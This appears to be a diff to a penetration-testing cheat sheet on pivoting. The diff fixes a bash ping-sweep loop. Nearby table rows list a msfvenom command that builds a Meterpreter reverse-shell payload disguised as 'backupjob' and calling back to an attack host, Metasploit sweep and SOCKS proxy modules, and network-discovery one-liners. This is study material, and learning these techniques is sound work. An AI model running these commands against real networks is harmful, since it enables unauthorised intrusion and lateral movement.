@@ -24,7 +24,7 @@
 | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080` | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob. |
 | `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`  | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`). |
 |                                                              |                                                              |
-| `for i in {1...254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
+| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
 | `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | For Loop used on a Windows-based system to discover devices in a specified network segment. |
 | `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. |
 | `msf6 > use auxiliary/server/socks_proxy`                      | Metasploit command that selects the `socks_proxy` auxiliary module. |
